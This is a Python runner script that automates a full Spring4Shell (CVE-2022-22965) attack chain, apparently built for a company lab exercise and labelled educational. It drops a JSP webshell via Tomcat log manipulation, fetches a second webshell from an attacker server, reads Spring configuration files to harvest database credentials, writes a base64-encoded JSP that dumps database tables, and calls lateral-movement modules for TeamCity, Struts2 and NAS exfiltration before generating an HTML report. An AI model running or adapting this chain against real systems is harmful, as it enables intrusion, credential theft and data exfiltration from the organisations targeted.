"""
run.py
Spring4Shell (CVE-2022-22965) - Docker Local Environment
Educational Use Only

Steps:
    STEP 1. Spring4Shell payload (AccessLogValve manipulation)
    STEP 2. Tomcat log flush
    STEP 3. Verify yaho4.jsp creation (up to 5 retries)
    STEP 4. Deploy health_check.jsp
            [A] curl via host.docker.internal
            [B] fallback: docker cp
    STEP 5. Verify health_check.jsp
    STEP 6. Threat Demonstration (Post-Exploitation)
"""

import urllib.request
import urllib.parse
import urllib.error
import subprocess
import time
import sys
import os
import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts"))

try:
    from stage1_dropper import ExploitConfig, Spring4ShellPayloadGenerator, ExploitController
    from stage2_uploader import UploadConfig, LocalFileServerAdapter, Stage1CommandAdapter, Stage2UploadUseCase
except ImportError as e:
    print(f"\n[ERROR] {e}")
    print("       stage1_dropper.py, stage2_uploader.py must be in the same folder.\n")
    sys.exit(1)


def header(title):
    print()
    print("=" * 60)
    print(f"  {title}")
    print("=" * 60)

def ok(msg):   print(f"  [OK]   {msg}")
def fail(msg): print(f"  [FAIL] {msg}")
def info(msg): print(f"  [*] {msg}")
def warn(msg): print(f"  [!] {msg}")
def step(n, title):
    print(f"\n{'=' * 60}")
    print(f"  STEP {n}. {title}")
    print(f"{'=' * 60}")


def base_url(url):
    parsed = urllib.parse.urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def http_get(url):
    try:
        res = urllib.request.urlopen(url, timeout=5)
        return res.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return -1


def check_shell(url):
    try:
        res = urllib.request.urlopen(url, timeout=8)
        raw = res.read().decode("utf-8", errors="ignore").strip()

        # 2단계 웹쉘(health_check.jsp)은 HTML을 반환하므로 <pre> 태그 안의 실행결과만 추출
        if "<pre>" in raw and "</pre>" in raw:
            import re
            match = re.search(r"<pre>(.*?)</pre>", raw, re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 1단계 웹쉘(yaho4.jsp)은 명령어 결과 뒤에 " // - try{..." 같은 로그 찌꺼기가 붙어 나옴
        # 첫 번째 라인만 추출하여 반환
        lines = raw.split("\n")
        if lines:
            return lines[0].strip()
            
        return raw
    except Exception as e:
        return f"[FAIL] {e}"


def detect_spring_container(default="01testserver-spring-1"):
    try:
        out = subprocess.check_output(["docker", "ps", "--format", "{{.Names}}"], text=True)
        for line in out.strip().split("\n"):
            name = line.strip()
            if name and "spring" in name.lower() and "db" not in name.lower():
                return name
    except Exception:
        pass
    return default


def main():
    print()
    print("=" * 60)
    print("  [SL Cyber-Shield] Spring4Shell Exploit Runner  (CVE-2022-22965)")
    print("  Docker Local Environment  |  Educational Use Only")
    print("=" * 60)

    header("Configuration")
    print()
    print("  Press Enter to use default values (localhost:8011).")
    print()

    DEFAULT_BASE     = "http://localhost:8011"
    DEFAULT_ENDPOINT = "/spring-form/login"
    DEFAULT_SHELL    = "yaho4"

    base_input     = input(f"  [?] Target Base URL  (default: {DEFAULT_BASE}): ").strip()
    BASE           = base_input.rstrip("/") if base_input else DEFAULT_BASE

    endpoint_input = input(f"  [?] Attack Endpoint  (default: {DEFAULT_ENDPOINT}): ").strip()
    ENDPOINT       = endpoint_input if endpoint_input else DEFAULT_ENDPOINT

    shell_input    = input(f"  [?] Stage1 Shell Name (default: {DEFAULT_SHELL}): ").strip()
    SHELL_NAME     = shell_input if shell_input else DEFAULT_SHELL

    TARGET_URL   = f"{BASE}{ENDPOINT}"
    FLUSH_URL    = TARGET_URL
    STAGER_URL   = f"{BASE}/{SHELL_NAME}.jsp"
    STAGE2_URL   = f"{BASE}/health_check.jsp?pwd=glory&cmd=id"
    ATTACKER_URL = "http://host.docker.internal:9090"

    print()
    print("  Target URL     :", TARGET_URL)
    print("  Stage1 Shell   :", STAGER_URL)
    print("  Stage2 Shell   :", STAGE2_URL)
    print("  Attacker Server:", ATTACKER_URL, "(Docker internal)")
    print()
    input("  [Enter] Start exploit...")

    results = {}
    details = {}  # 보고서용 각 Step 상세 데이터 (성공/실패 무관하게 항상 기록)

    # STEP 1
    step(1, "Spring4Shell Payload Transmission (AccessLogValve Manipulation)")

    config    = ExploitConfig(target_url=TARGET_URL, filename=SHELL_NAME)
    generator = Spring4ShellPayloadGenerator(config)
    controller = ExploitController(generator)
    success = controller.run_exploit(TARGET_URL)

    if success:
        ok("Payload sent successfully.")
        details["step1"] = f"타겟: {TARGET_URL}\nSpring Data Binding 취약점(CVE-2022-22965)을 이용해 Tomcat AccessLogValve 속성 변조 페이로드를 성공적으로 전송했습니다."
    else:
        fail("Payload failed. Check network or target URL.")
        details["step1"] = f"타겟: {TARGET_URL}\n페이로드 전송에 실패했습니다. 네트워크 연결 및 타겟 URL을 확인하세요."

    results["step1"] = success
    if not success:
        sys.exit(1)

    # STEP 2
    step(2, "Tomcat Log Flush (write webshell to disk)")

    info(f"Sending GET {FLUSH_URL}")
    code = http_get(FLUSH_URL)
    info(f"Response code: {code}")
    ok("Flush complete. Waiting for yaho4.jsp creation...")
    details["step2"] = f"GET {FLUSH_URL} → HTTP {code}\nTomcat AccessLog 버퍼가 비워지면서 페이로드 코드가 {SHELL_NAME}.jsp 파일로 디스크에 기록됩니다."
    results["step2"] = True
    time.sleep(2)

    # STEP 3
    step(3, f"Verify Stage1 Shell ({SHELL_NAME}.jsp) - max 5 retries")

    stager_ok = False
    stager_result_log = []
    for attempt in range(1, 6):
        result = check_shell(f"{STAGER_URL}?cmd=whoami")
        stager_result_log.append(f"[{attempt}/5] {SHELL_NAME}.jsp?cmd=whoami → {result[:80]}")
        info(f"  [{attempt}/5] {SHELL_NAME}.jsp?cmd=whoami -> {result[:60]}")

        if result and "404" not in result and "FAIL" not in result and "Error" not in result:
            ok(f"Stage1 shell confirmed! User: {result.strip()[:40]}")
            stager_ok = True
            break

        warn(f"Not yet. Re-sending payload and flush ({attempt}/5)...")
        controller.run_exploit(TARGET_URL)
        for _ in range(3):
            http_get(FLUSH_URL)
            time.sleep(1)
        time.sleep(2)

    if stager_ok:
        details["step3"] = f"웹쉘 URL: {STAGER_URL}?cmd=whoami\n\n확인 로그:\n" + "\n".join(stager_result_log)
    else:
        warn(f"{SHELL_NAME}.jsp not found. Will try docker cp in STEP 4.")
        details["step3"] = f"웹쉘 미생성. docker cp 방식으로 Stage2를 직접 배포합니다.\n\n시도 로그:\n" + "\n".join(stager_result_log)

    results["step3"] = stager_ok

    # STEP 4
    step(4, "Deploy Stage2 Shell (health_check.jsp)")

    deploy_ok = False

    # Method A: curl via host.docker.internal
    if stager_ok:
        info("[A] Trying curl download via host.docker.internal...")
        upload_config = UploadConfig(
            stager_url       = STAGER_URL,
            stage2_file      = "health_check.jsp",
            local_serve_port = 9090,
            target_save_dir  = "/usr/local/tomcat/webapps/ROOT",
            attacker_url     = ATTACKER_URL,
        )
        file_server = LocalFileServerAdapter()
        executor    = Stage1CommandAdapter()
        use_case    = Stage2UploadUseCase(file_server, executor, upload_config)
        use_case.run()
        time.sleep(2)

        check_a = check_shell(f"{BASE}/health_check.jsp?pwd=glory&cmd=id")
        if "root" in check_a or "uid=" in check_a:
            ok("[A] curl download successful! health_check.jsp deployed.")
            deploy_ok = True
        else:
            warn("[A] curl failed. Switching to docker cp...")
    else:
        warn("Stage1 shell not available. Trying docker cp directly...")

    # Method B: docker cp (automatic fallback)
    if not deploy_ok:
        info("[B] Trying docker cp...")
        container = detect_spring_container()
        info(f"    Detected container: {container}")

        src  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts", "health_check.jsp")
        dest = f"{container}:/usr/local/tomcat/webapps/ROOT/health_check.jsp"
        cmd  = ["docker", "cp", src, dest]

        info(f"    Command: {' '.join(cmd)}")
        try:
            subprocess.run(cmd, check=True)
            ok("[B] docker cp successful! health_check.jsp deployed.")
            deploy_ok = True
            details["step4"] = f"[B] docker cp 방식으로 배포\n명령: {' '.join(cmd)}\n결과: 성공 — health_check.jsp가 컨테이너 내부에 복사되었습니다."
        except subprocess.CalledProcessError:
            fail("[B] docker cp failed. Check if container is running.")
            info(f"    Manual: docker cp health_check.jsp {container}:/usr/local/tomcat/webapps/ROOT/")
            details["step4"] = f"[B] docker cp 실패\n명령: {' '.join(cmd)}\n컨테이너({container})가 실행 중인지 확인하세요."
    else:
        if deploy_ok:
            details.setdefault("step4", "[A] curl 방식으로 health_check.jsp 배포 성공")

    results["step4"] = deploy_ok

    # STEP 5
    step(5, "Verify Stage2 Shell (health_check.jsp)")

    info(f"Access URL: {STAGE2_URL}")
    result2 = check_shell(STAGE2_URL)
    info(f"Response: {result2}")

    if "root" in result2 or "uid=" in result2:
        ok(f"Stage2 shell working! Result: {result2.strip()}")
        details["step5"] = f"웹쉘 URL: {STAGE2_URL}\n\n실행 결과 (id 명령):\n{result2.strip()}"
        results["step5"] = True
    else:
        warn("Stage2 shell response unexpected.")
        info(f"Check manually: {STAGE2_URL}")
        details["step5"] = f"웹쉘 URL: {STAGE2_URL}\n\n응답 내용 (예상과 다름):\n{result2.strip()[:300]}"
        results["step5"] = False

    # STEP 6
    step(6, "Info Leakage (Find DB Clients & Spring Configs via RCE)")
    
    db_credentials = {}
    found_clients = []
    import re as _re
    
    if results.get("step5", False):
        info("Phase 1: Finding DB clients (mysql, psql, sqlite3)...")
        for client in ["mysql", "psql", "sqlite3"]:
            res = check_shell(f"{BASE}/health_check.jsp?pwd=glory&cmd=which%20{client}")
            if res and "not found" not in res and "FAIL" not in res and len(res.strip()) > 0:
                found_clients.append(client)
        
        if found_clients:
            info(f" -> Found DB clients: {', '.join(found_clients)}")
        else:
            info(" -> No standard DB clients (mysql/psql) found in the container.")
            
        info("Phase 2: Finding Spring Boot configuration files...")
        find_cmd = 'find /usr/local/tomcat/webapps -name "application.properties" -o -name "application.yml" 2>/dev/null'
        find_res = check_shell(f"{BASE}/health_check.jsp?pwd=glory&cmd=" + urllib.parse.quote(find_cmd))
        
        target_prop_file = ""
        if find_res and "application" in find_res:
             files = find_res.split("\n")
             for f in files:
                 f = f.strip()
                 if "application.properties" in f:
                     target_prop_file = f
                     break
             info(f" -> Found config file: {target_prop_file}")
             
        if not target_prop_file:
            target_prop_file = "/usr/local/tomcat/webapps/spring-form/WEB-INF/classes/application.properties"
            info(f" -> Using default config file path: {target_prop_file}")
            
        info(f"Phase 2-1: Extracting DB credentials from configuration...")
        cat_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=cat%20" + urllib.parse.quote(target_prop_file)
        props_result = check_shell(cat_url)
        
        # Parse spring properties
        if props_result:
            for line in props_result.split("\n"):
                if "spring.datasource.url=" in line:
                    db_credentials['url'] = line.split("=", 1)[1].strip()
                    match = _re.search(r'jdbc:[a-z]+://([^:]+):', db_credentials['url'])
                    if match:
                        db_credentials['host'] = match.group(1)
                elif "spring.datasource.username=" in line:
                    db_credentials['user'] = line.split("=", 1)[1].strip()
                elif "spring.datasource.password=" in line:
                    db_credentials['pass'] = line.split("=", 1)[1].strip()
                    
        if db_credentials.get('url'):
            ok(f"DB Credentials extracted successfully! (User: {db_credentials.get('user')})")
            results["step6"] = True
        else:
            warn("Failed to extract DB credentials from properties.")
            results["step6"] = False

        # 보고서 - 항상 수집된 내용 기록
        details["step6"] = {
            "clients": found_clients if found_clients else ["없음 (컨테이너에 mysql/psql 클라이언트 없음)"],
            "config_file": target_prop_file,
            "raw_props": props_result[:800] if props_result else "설정 파일 읽기 실패",
            "credentials": db_credentials,
        }
    else:
        warn("Skipped Step 6 because Stage2 shell is not verified.")
        results["step6"] = False
        details["step6"] = {"clients": [], "config_file": "", "raw_props": "Stage2 웹쉘이 없어 실행 스킵됨", "credentials": {}}

    # STEP 7
    step(7, "Internal DB Access via RCE (Post-Exploitation)")
    
    db_dump_result = ""
    run_mode = ""
    
    if results.get("step6", False):
        if "mysql" in found_clients and db_credentials.get('host'):
            info("Phase 3: Connecting to DB directly using the 'mysql' client via RCE...")
            run_mode = "Native MySQL Client"
            
            db_host = db_credentials.get('host', '127.0.0.1')
            db_user = db_credentials.get('user', '')
            db_pass = db_credentials.get('pass', '')
            
            mysql_cmd = f'mysql -h {db_host} -u {db_user} -p{db_pass} -e "SHOW DATABASES; SELECT version();"'
            run_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=" + urllib.parse.quote(mysql_cmd)
            res = check_shell(run_url)
            
            if res and "FAIL" not in res and "command not found" not in res:
                db_dump_result = res
                ok("Successfully executed MySQL client via RCE!")
                results["step7"] = True
            else:
                warn("MySQL client failed to connect. Falling back to JSP injection...")
                results["step7"] = False
                
        if not results.get("step7", False):
            info("Phase 3: DB client not available. Deploying Custom JSP JDBC payload via RCE...")
            run_mode = "Custom JSP Injection"
            
            jsp_code = '''<%@ page import="java.sql.*" %>
<%
try {
    Class.forName("com.mysql.cj.jdbc.Driver");
    Connection c = DriverManager.getConnection(request.getParameter("u"), request.getParameter("n"), request.getParameter("p"));
    Statement s = c.createStatement();
    ResultSet rs = s.executeQuery("SHOW TABLES");
    while (rs.next()) {
        String t = rs.getString(1);
        out.println("<b>[Table: " + t + "]</b><br>");
        try {
            Statement s2 = c.createStatement();
            ResultSet r2 = s2.executeQuery("SELECT * FROM " + t + " LIMIT 3");
            ResultSetMetaData md = r2.getMetaData();
            int cols = md.getColumnCount();
            while(r2.next()) {
                for(int i=1; i<=cols; i++) out.print(md.getColumnName(i) + "=" + r2.getString(i) + " | ");
                out.println("<br>");
            }
            r2.close(); s2.close();
        } catch(Exception e) { out.println("Error reading table " + t + ": " + e.getMessage() + "<br>"); }
    }
    rs.close(); s.close(); c.close();
} catch(Exception e) { out.println("DB Connection Error: " + e.getMessage()); }
%>'''
            
            import base64
            b64_jsp = base64.b64encode(jsp_code.encode()).decode()
            
            write_cmd = f"echo {b64_jsp} | base64 -d > /usr/local/tomcat/webapps/spring-form/db_dump.jsp"
            write_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=" + urllib.parse.quote(write_cmd)
            check_shell(write_url)
            time.sleep(1)
            
            info("Executing DB query via deployed RCE JSP payload...")
            dump_url = f"{BASE}/spring-form/db_dump.jsp?u={urllib.parse.quote(db_credentials.get('url', ''))}&n={urllib.parse.quote(db_credentials.get('user', ''))}&p={urllib.parse.quote(db_credentials.get('pass', ''))}"
            
            req = urllib.request.Request(dump_url)
            try:
                res = urllib.request.urlopen(req, timeout=10)
                db_dump_result = res.read().decode("utf-8", errors="ignore").strip()
                if "[Table:" in db_dump_result:
                    ok("Successfully accessed and extracted internal DB data via RCE JSP Payload!")
                    results["step7"] = True
                else:
                    warn(f"Failed to dump DB data. Result: {db_dump_result[:100]}")
                    results["step7"] = False
            except Exception as e:
                warn(f"Exception during DB dump via JSP: {e}")
                results["step7"] = False
    else:
        warn("Skipped Step 7 because Step 6 (Credential Extraction) failed.")
        results["step7"] = False
        db_dump_result = "Step 6 (크리덴셜 추출)이 실패하여 DB 접근을 시도하지 못했습니다."
        run_mode = "스킵됨"

    # STEP 8
    step(8, "Lateral Movement (TeamCity & Struts2)")
    step8_result = ""
    if results.get("step5", False):
        try:
            from stage3_lateral_movement import LateralMovementCoordinator
            coordinator = LateralMovementCoordinator(STAGE2_URL, pwd="glory")
            info("Starting Lateral Movement Scenario 2 (TeamCity -> Struts2)...")
            step8_result = coordinator.run_scenario2_teamcity_struts()
            if "[SUCCESS] 임직원 DB 데이터 탈취 성공!" in step8_result:
                ok("Successfully executed Lateral Movement Scenario 2!")
                results["step8"] = True
            else:
                warn("Failed to complete Lateral Movement Scenario 2.")
                results["step8"] = False
        except Exception as e:
            warn(f"Exception during Scenario 2: {e}")
            results["step8"] = False
    else:
        warn("Skipped Step 8 because Stage2 shell is not verified.")
        results["step8"] = False

    # STEP 9
    step(9, "NAS SMB Data Extraction (JCIFS)")
    step9_result = ""
    if results.get("step5", False):
        info("Starting Lateral Movement Scenario 3 (NAS SMB)...")
        try:
            from stage3_lateral_movement import LateralMovementCoordinator
            coordinator = LateralMovementCoordinator(STAGE2_URL, pwd="glory")
            step9_result = coordinator.run_scenario3_nas_smb()
            if "[SUCCESS] 내부망 기밀 데이터" in step9_result or "[FILE]" in step9_result:
                ok("Successfully executed NAS SMB Data Extraction!")
                results["step9"] = True
            else:
                warn("Failed to extract data from NAS via SMB.")
                results["step9"] = False
        except Exception as e:
            warn(f"Exception during Scenario 3: {e}")
            results["step9"] = False
    else:
        warn("Skipped Step 9 because Stage2 shell is not verified.")
        results["step9"] = False

    # ══════════════════════════════════════════════════════════
    # 최종 결과 요약 & 보고서 생성
    # ══════════════════════════════════════════════════════════
    header("Result Summary")
    
    all_pass = all(results.values())
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    now = datetime.datetime.now()

    labels = {
        "step1": "STEP 1 | Payload Transmission",
        "step2": "STEP 2 | Tomcat Log Flush",
        "step3": f"STEP 3 | Stage1 ({SHELL_NAME}.jsp) Verified",
        "step4": "STEP 4 | Stage2 Deployed (curl or docker cp)",
        "step5": "STEP 5 | Stage2 (health_check.jsp) Verified",
        "step6": "STEP 6 | Info Leakage (Find DB Clients & Configs via RCE)",
        "step7": "STEP 7 | Internal DB Access via RCE",
        "step8": "STEP 8 | Lateral Movement (TeamCity & Struts2)",
        "step9": "STEP 9 | NAS SMB Data Extraction"
    }

    html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>sl-cyber-shield | Automated Exploitation Report</title>
    <style>
        :root {{
            --sl-dark-blue: #00205B;
            --sl-blue-primary: #0192BF;
            --sl-accent: #00b8d4;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }}
        body {{ 
            font-family: 'Inter', 'Segoe UI', sans-serif; 
            background: radial-gradient(circle at top right, #001a4d, #000814); 
            color: #f8f9fa; 
            margin: 0; 
            padding: 40px 20px;
            line-height: 1.6;
        }}
        .container {{ 
            max-width: 1100px; 
            margin: auto; 
            background: var(--glass-bg); 
            backdrop-filter: blur(20px); 
            padding: 50px; 
            border-radius: 24px; 
            border: 1px solid var(--glass-border); 
            box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
        }}
        .header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            border-bottom: 1px solid var(--glass-border);
            padding-bottom: 20px;
        }}
        .logo-text {{
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            color: var(--sl-blue-primary);
        }}
        h1 {{ 
            font-size: 2.5em;
            font-weight: 800;
            background: linear-gradient(135deg, #fff 0%, var(--sl-blue-primary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }}
        h2 {{ 
            color: var(--sl-blue-primary); 
            font-size: 1.5em; 
            margin-top: 40px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        .summary {{ 
            background: rgba(255, 255, 255, 0.03); 
            padding: 30px; 
            border-radius: 16px; 
            margin-bottom: 40px; 
            border-left: 4px solid var(--sl-blue-primary);
        }}
        .visual-journey {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 30px;
        }}
        .evidence-card {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--glass-border);
        }}
        .evidence-card img {{
            width: 100%;
            height: auto;
            display: block;
        }}
        .evidence-label {{
            padding: 10px;
            font-size: 0.85em;
            color: #888;
            text-align: center;
            background: rgba(0,0,0,0.5);
        }}
        .step {{ 
            margin-bottom: 30px; 
            padding: 24px; 
            background: rgba(255, 255, 255, 0.02); 
            border-radius: 16px; 
            border: 1px solid var(--glass-border);
            transition: transform 0.3s ease;
        }}
        .step:hover {{
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.04);
        }}
        .step.success {{ border-left: 4px solid var(--sl-blue-primary); }}
        .step.fail {{ border-left: 4px solid #444; opacity: 0.6; }}
        .badge {{
            display: inline-block;
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 0.8em;
            font-weight: 700;
            text-transform: uppercase;
        }}
        .badge-success {{ background: rgba(1, 146, 191, 0.2); color: var(--sl-blue-primary); border: 1px solid var(--sl-blue-primary); }}
        .badge-fail {{ background: rgba(255, 255, 255, 0.1); color: #888; border: 1px solid #444; }}
        pre {{ 
            background: #000a1a; 
            color: #00d4ff; 
            padding: 20px; 
            border-radius: 12px; 
            font-family: 'JetBrains Mono', monospace; 
            font-size: 13px; 
            border: 1px solid rgba(0, 212, 255, 0.1);
            box-shadow: inset 0 0 20px rgba(0, 212, 255, 0.05);
        }}
        .footer {{ 
            text-align: center; 
            margin-top: 80px; 
            color: #444; 
            font-size: 0.9em; 
            border-top: 1px solid var(--glass-border); 
            padding-top: 30px; 
        }}
        .desc {{ color: #ccc; line-height: 1.7; margin-bottom: 20px; font-size: 1em; }}
        .res-box {{ background-color: rgba(0,0,0,0.2); padding: 20px; border: 1px solid var(--glass-border); border-radius: 12px; margin-top: 15px; }}
        .cred-highlight {{ color: var(--sl-blue-primary); font-weight: bold; }}
        ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 15px; }}
        ul.creds li {{ background: rgba(255, 255, 255, 0.03); margin-bottom: 8px; padding: 12px; border-left: 4px solid var(--sl-blue-primary); font-family: monospace; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-text">SL SMART FACTORY</div>
            <div style="font-size: 14px; color: #888;">{current_time}</div>
        </div>
        
        <h1>🛡️ 침투 분석 결과 보고서 <br><span style="font-size: 0.5em; color: var(--sl-blue-primary);">SCS-EP INTEGRATED SECURITY REPORT</span></h1>
        
        <div class="summary">
            <h2>📊 시뮬레이션 개요</h2>
            <p class="desc">
                본 보고서는 에스엘(SL) 내부망의 보안 탄력성 측정을 위한 <strong>APT(Advanced Persistent Threat)</strong> 시뮬레이션 결과입니다. 
                Spring4Shell 취약점을 통한 최초 침투부터 내부망 횡적 이동(Lateral Movement)까지 전 과정을 가시화합니다.
            </p>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 40px; font-size:14px;">
                <div>
                    <p style="color:#888; margin-bottom:5px;">Target Endpoint</p>
                    <a style="color:var(--sl-blue-primary); font-family:monospace;" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a>
                </div>
                <div>
                    <p style="color:#888; margin-bottom:5px;">Overall Status</p>
                    {f'<span class="badge badge-success">Exploitation Success</span>' if all_pass else '<span class="badge badge-fail">Blocked / Incomplete</span>'}
                </div>
            </div>
            
            <h3 style="margin-top:30px; font-size:1.1em; color:var(--sl-blue-primary);">🌐 Visual Attack Journey (핵심 증적)</h3>
            <div class="visual-journey">
                <div class="evidence-card">
                    <img src="https://raw.githubusercontent.com/glory903-devsecops/sl-cyber-shield/main/docs/assets/initial_login.png" onerror="this.src='https://placehold.co/600x400/000a1a/00d4ff?text=Initial+Login+Page'">
                    <div class="evidence-label">[Before] 정상적인 서비스 인터페이스 (Initial Access Target)</div>
                </div>
                <div class="evidence-card">
                    <img src="https://raw.githubusercontent.com/glory903-devsecops/sl-cyber-shield/main/docs/assets/attack_success.png" onerror="this.src='https://placehold.co/600x400/000a1a/00d4ff?text=WebShell+Success+PoC'">
                    <div class="evidence-label">[After] 원격 코드 실행(RCE) 성공 증적</div>
                </div>
            </div>
        </div>

        <h2>🕵️ 단계별 상세 타임라인</h2>
"""

    step_descriptions = {
        "step1": "Spring Framework Data Binding 취약점을 이용한 Tomcat 로그 속성 변조 시도 및 페이로드 전송.",
        "step2": "Webshell Drop: 물리 디스크 내 yaho4.jsp 생성을 유도하는 트리거 트래픽 발생.",
        "step3": "1단계 웹쉘(Stager) 접속 상태 점검을 통해 초기 침투 성공(RCE) 여부 확인.",
        "step4": "Post-Exploitation: 내부 침투 심화를 위한 완성형 Stage2 웹쉘(health_check.jsp) 배포.",
        "step5": "거점 확보 완료: 완성형 웹쉘의 무결성 및 명령 실행 권한 지속성 검증.",
        "step6": "<strong>Credential Harvesting</strong>: RCE를 활용한 내부 인프라 DB 접속 정보 및 핵심 설정 파일 탐색/탈취.",
        "step7": "<strong>Threat Simulation (DB)</strong>: 탈취된 계정을 재사용하여 내부망 DB(Spring DB) 테이블 무단 덤프.",
        "step8": "<strong>Lateral Movement (Struts & TC)</strong>: 빌드 서버(TeamCity) 취약점 연계 및 Struts2 파일 업로드 취약점 악용을 통한 임직원 DB 탈취.",
        "step9": "<strong>Exfiltration (NAS SMB)</strong>: 분리된 사내 연구망 NAS 스토리지의 접근 권한 확보 및 제품 설계 도면 리스트 탈취."
    }

    def _esc(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    for key, label in labels.items():
        passed = results.get(key, False)
        status_class = "success" if passed else "fail"
        badge = '<span class="badge badge-success">Success</span>' if passed else '<span class="badge badge-fail">Incomplete</span>'
        desc = step_descriptions.get(key, "")
        detail = ""

        if key in ["step1", "step2", "step3", "step4", "step5"] and key in details:
            detail = f"<div class='res-box'><pre>{_esc(details[key])}</pre></div>"
        elif key == "step6":
            d6 = details.get("step6", {})
            creds = d6.get("credentials", {})
            clients_str = ", ".join(d6.get("clients", [])) or "없음"
            raw_props = _esc(d6.get("raw_props", "")[:600])
            cred_html = f"""<ul class='creds'>
                <li>DB URL : <span style='color:#e94560'>{_esc(creds.get('url',''))}</span></li>
                <li>USER   : <span style='color:#e94560'>{_esc(creds.get('user',''))}</span></li>
                <li>PASS   : <span style='color:#e94560'>{_esc(creds.get('pass',''))}</span></li>
            </ul>""" if creds.get("url") else "<p style='color:#e74c3c'>설정 파일에서 DB 접속 정보를 추출하지 못했습니다.</p>"
            detail = f"""<div class='res-box'>
                <p class='cred-highlight'>발견된 DB 클라이언트: {_esc(clients_str)}</p>
                <p>설정 파일: <code style='color:#f39c12'>{_esc(d6.get('config_file',''))}</code></p>
                {cred_html}
                <p style='color:#888;margin-top:10px'>설정 파일 원문 (앞 600자):</p>
                <pre>{raw_props}</pre>
            </div>"""
        elif key == "step7":
            mode_label = _esc(run_mode) if run_mode else "미실행"
            dump_display = _esc(db_dump_result)[:1200] if db_dump_result else "덤프 결과 없음"
            detail = f"""<div class='res-box'>
                <p class='cred-highlight'>실행 방법: {mode_label}</p>
                <pre>{dump_display}</pre>
            </div>"""
        elif key == "step8":
            s8_display = _esc(step8_result)[:2000] if step8_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
            detail = f"<div class='res-box'><pre>{s8_display}</pre></div>"
        elif key == "step9":
            s9_display = _esc(step9_result)[:2000] if step9_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
            detail = f"<div class='res-box'><pre>{s9_display}</pre></div>"

        html_content += f"""
            <div class="step {status_class}">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                    <h3 style="margin:0; font-size:1.2em;">{label}</h3>
                    {badge}
                </div>
                <p class="desc" style="margin-top:0;">{desc}</p>
                {detail}
            </div>
        """

    html_content += """
            <div class="footer">
                <p>본 실습 결과 보고서는 SL Factory Innovation Team의 공정 보안 고도화를 위한 위협 모델링 결과물입니다.<br> 
                SCS-EP(Cyber-Shield) 엔진에 의해 자동 생성되었으며, 무단 복제 및 상용 목적 사용을 금합니다.</p>
            </div>
        </div>
    </body>
    </html>
    """

    report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "03.FinalReport")
    os.makedirs(report_dir, exist_ok=True)
    report_filename = f"main_scenario_report_{now.strftime('%Y%m%d_%H%M%S')}.html"
    report_path = os.path.join(report_dir, report_filename)
    try:
        with open(report_path, "w", encoding="utf-8") as rf:
            rf.write(html_content)
        print(f"  [📄 HTML 보고서 생성] 03.FinalReport/{report_filename} 파일을 열어보세요!")
    except Exception as e:
        print(f"  [WARNING] 보고서 생성 실패: {e}")

    print()


if __name__ == "__main__":
    main()
